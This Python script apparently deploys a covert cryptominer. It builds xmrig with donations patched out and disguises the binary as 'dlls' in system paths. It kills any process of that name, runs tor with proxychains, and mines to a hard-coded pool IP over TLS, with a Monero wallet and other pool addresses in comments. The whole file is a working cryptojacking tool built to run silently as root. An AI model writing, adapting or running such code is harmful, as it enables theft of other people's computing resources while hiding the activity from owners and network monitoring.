__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'dlls'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count()
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    os.system('apt-get update -y')
    os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/rofl0r/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.chdir('/root')
        os.system('git clone https://github.com/xmrig/xmrig.git')
        os.system('sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = 0/g" /root/xmrig/src/donate.h')
        os.system('cd xmrig && mkdir build && cd build && cmake .. && make')
        #os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig_tls/' + program)
        #os.system('chmod 777 ' + program)
        os.chdir('/root/xmrig/build/')
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/bin/' + program)
        time.sleep (2)
except:
    pass
#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program + ' -o stratum+tcp://66.42.53.57:442 --tls -t ' + str(cores))
#os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://66.42.93.164:442 --tls -t ' + str(cores))